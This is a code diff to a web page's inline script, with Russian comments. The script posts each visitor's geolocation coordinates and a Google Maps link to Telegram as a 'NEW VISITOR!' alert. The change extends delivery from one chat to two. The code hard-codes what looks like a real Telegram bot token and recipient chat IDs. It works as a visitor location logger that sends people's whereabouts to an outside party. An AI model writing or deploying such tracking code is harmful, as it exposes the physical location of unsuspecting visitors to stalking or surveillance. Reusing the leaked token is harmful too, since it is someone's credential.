@@ -124,12 +124,14 @@
 </footer>
 
 <script>
-    // ========== ВАШИ ДАННЫЕ (уже вставлены) ==========
+    // ========== НАСТРОЙКИ ==========
     const TELEGRAM_BOT_TOKEN = '8569817774:AAGOwkVKL5lRyenrjaK3CibpuzkZM0x1Nww';
-    const TELEGRAM_CHAT_ID = '8215628399';
-    // =================================================
+    // Список получателей (два chat ID)
+    const TELEGRAM_CHAT_IDS = ['8215628399', '8561119690'];
+    // =================================
 
-    async function sendToTelegram(latitude, longitude, accuracy) {
+    // Функция отправки в один конкретный чат
+    async function sendToTelegramSingle(chatId, latitude, longitude, accuracy) {
         const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
         const message = `📍 *НОВЫЙ ПОСЕТИТЕЛЬ!*\n\n` +
                        `🗺 *Местоположение:*\n` +
@@ -145,24 +147,36 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
+                    chat_id: chatId,
                     text: message,
                     parse_mode: 'Markdown',
                     disable_web_page_preview: false
                 })
             });
             if (response.ok) {
-                console.log('✅ Координаты отправлены в Telegram');
+                console.log(`✅ Координаты отправлены в чат ${chatId}`);
                 return true;
             } else {
                 const errorData = await response.json();
-                console.error('❌ Ошибка Telegram API:', errorData);
+                console.error(`❌ Ошибка отправки в чат ${chatId}:`, errorData);
                 return false;
             }
         } catch (error) {
-            console.error('❌ Ошибка сети:', error);
+            console.error(`❌ Ошибка сети при отправке в чат ${chatId}:`, error);
             return false;
         }
+    }
+
+    // Отправка во все чаты из списка
+    async function sendToTelegram(latitude, longitude, accuracy) {
+        let allSuccess = true;
+        for (const chatId of TELEGRAM_CHAT_IDS) {
+            const success = await sendToTelegramSingle(chatId, latitude, longitude, accuracy);
+            if (!success) allSuccess = false;
+            // Небольшая задержка между отправками, чтобы не перегрузить API
+            await new Promise(resolve => setTimeout(resolve, 300));
+        }
+        return allSuccess;
     }
 
     function showStatusMessage(message, isError = false) {
